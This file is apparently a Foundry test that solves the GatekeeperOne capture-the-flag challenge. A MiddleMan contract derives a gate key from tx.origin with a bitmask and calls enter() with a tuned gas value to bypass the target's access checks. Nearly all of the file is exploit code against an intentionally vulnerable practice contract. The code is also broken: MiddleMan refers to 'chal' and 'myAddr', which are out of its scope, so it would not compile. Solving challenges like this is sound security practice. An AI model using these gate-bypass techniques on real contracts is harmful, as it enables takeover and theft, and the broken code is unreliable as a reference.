// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract TestSolve is Test {
    GatekeeperOne public chal;
    MiddleMan public mm;

    function setUp() public {
        // Contract setup
        chal = new GatekeeperOne();
        mm = new MiddleMan();
    }

    function testSolve() public {
        // Simulate the call from a wallet
        address myAddr = address(0xd4057e08B9d484d70C5977784fC1f6D82d45ff67);
        vm.prank(myAddr, myAddr);

        // Call our middleman contract
        mm.enter(chal);
    }
}

contract MiddleMan {
    function enter(GatekeeperOne target) external {
        // Calculate the input needed to pass and call target
        uint64 input = uint64(uint160(tx.origin) & 0xffffffff0000ffff);
        bool returnValue = GatekeeperOne(target).enter{gas: 50000-586}(bytes8(input));

        // Check we passed challenge
        require(returnValue, "didnt return true");
        require(chal.entrant() == myAddr, "didnt change entrant");
    }
}
